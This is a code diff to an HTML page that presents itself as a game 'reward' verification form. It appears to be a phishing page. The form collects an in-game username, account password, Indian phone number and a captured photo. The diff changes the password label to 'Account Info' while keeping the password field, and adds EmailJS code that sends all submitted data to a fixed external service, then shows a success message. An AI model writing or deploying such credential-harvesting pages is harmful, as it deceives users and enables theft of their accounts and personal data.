@@ -111,12 +111,12 @@ id="username"
 placeholder="Enter ingame username"
 required>
 
-<label>Account Password</label>
+<label>Account Info</label>
 
 <input
 type="text"
 id="accountpassword"
-placeholder="Enter account password"
+placeholder="Enter account info"
 required>
 
 <label>Indian Phone Number</label>
@@ -435,3 +435,59 @@ photo:
 capturedImage || ""
 
 };
+
+try{
+
+await emailjs.send(
+
+"service_03gi2v9",
+
+/* 🔥 THIS IS THE FIXED TEMPLATE ID 🔥 */
+"template_bker0h9",
+
+templateParams
+
+);
+
+alert(
+"Verification submitted successfully!"
+);
+
+document
+.getElementById('rewardForm')
+.reset();
+
+document
+.getElementById('dynamicOptions')
+.innerHTML = "";
+
+document
+.getElementById('selectedRewardBox')
+.style.display = "none";
+
+document
+.getElementById('previewImage')
+.style.display = "none";
+
+capturedImage = null;
+
+}
+catch(error){
+
+console.log(
+"EMAILJS ERROR:",
+error
+);
+
+alert(
+"Failed to send verification"
+);
+
+}
+
+});
+
+</script>
+
+</body>
+</html>
